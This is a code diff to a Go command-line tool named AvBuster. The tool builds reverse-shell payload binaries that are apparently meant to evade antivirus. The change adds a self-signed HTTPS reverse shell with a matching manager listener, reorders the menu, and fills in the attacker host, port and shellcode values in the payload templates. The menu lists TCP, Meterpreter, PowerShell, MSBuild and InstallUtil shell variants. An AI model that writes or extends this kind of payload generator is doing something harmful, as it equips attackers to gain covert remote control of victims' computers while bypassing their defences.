@@ -63,8 +63,8 @@ func main() {
 	for choice != "0" {
 		gr.Println("1. TCP Normal Reverse Shell\t\t2. Hybrid Encrypted Reverse Shell")
 		gr.Println("3. HTTP Reverse Shell      \t\t4.Meterpreter HTTP Shell")
-		gr.Println("5. HTTPS[Pinned] Reverse Shell     \t\t6. Meterpreter HTTPS Shell")
-		gr.Println("7. PowerShell TCP Reverse Shell\t8. PowerShell Custom Shell Code")
+		gr.Println("5. HTTPS[Pinned] Reverse Shell     \t6. Meterpreter HTTPS Shell")
+		gr.Println("7. HTTPS[Self Signed] Reverse Shell\t8. PowerShell TCP Reverse Shell")
 		gr.Println("9. MS Build TCP Reverse Shell\t\t10. MS Xml Xslt TCP Reverse Shell")
 		gr.Println("11. InstallUtil TCP Reverse Shell\t12. MS ForFiles")
 		rd.Printf("0. Exit\n")
@@ -136,17 +136,22 @@ func main() {
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
 			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
-		} else if choice == "7" {
+		} else if choice == "8" {
 			//usrvals = readvalues(choice)
 			outpath = filepath.FromSlash("outfiles/powrevtcp.go")
 			usrvals.binarytemplate = binarytemplates.AvBusterPowerShellTCPReverseShell
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
 			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
-		} else if choice == "8" {
-			outpath = filepath.FromSlash("outfiles/psrevcustom.go")
-			usrvals.binarytemplate = binarytemplates.AvBusterPowerShellCustomShellCode
+		} else if choice == "7" {
+			outpath = filepath.FromSlash("outfiles/selfsignedhttps.go")
+			usrvals.binarytemplate = binarytemplates.AvBusterSelfSignedHttps
 			go createavbusterpayload(usrvals, false, finflag)
+			<-finflag
+			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
+			manageroutpath = filepath.FromSlash("outfiles/selfsignedhttpsmanager.go")
+			usrvals.binarytemplate = binarytemplates.AvBusterSelfSignedHttpsManager
+			go createavbusterpayload(usrvals, true, finflag)
 			<-finflag
 			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
 		}
@@ -169,7 +174,7 @@ func readvalues(choice string) UserValues {
 	bl := color.New(color.FgHiBlue, color.Bold)
 	var fprint, selectedos, selectedarch, shellcode, lhost, lport string
 	actualusrvals := UserValues{}
-	if choice == "8" {
+	if choice == "12" {
 		var printshelltype string
 		actualusrvals.userchoice = "8"
 		bl.Printf("(AvBuster) > ")
@@ -209,7 +214,7 @@ func readvalues(choice string) UserValues {
 			fprint, _ = options.ReadString('\n')
 			fprint = removenewline(fprint)
 		}
-		if choice == "7" {
+		if choice == "8" {
 			selectedos = "windows"
 		} else {
 			bl.Printf("(AvBuster) > ")
@@ -378,6 +383,7 @@ func readandreplacefilecontent(ipport string) string {
 
 func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag chan string) {
 	var setpath, valuetowrite string
+	fmt.Println(userselectedval.saveas)
 	if ismanager {
 		dwnloadlink.Link = "download/" + userselectedval.saveas + "manager" + ".exe"
 
@@ -401,9 +407,9 @@ func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag c
 	portreplaced := strings.Replace(ipreplaced, "RPORT", userselectedval.lport, 1)
 	valuetowrite = strings.Replace(portreplaced, "SHELLCODE", userselectedval.shellcode, 1)
 
-	fmt.Println(valuetowrite)
+	//fmt.Println(valuetowrite)
 
-	//fmt.Println(setpath)
+	fmt.Println(setpath)
 	newFile, err := os.Create(setpath)
 	if err != nil {
 		log.Fatal(err)
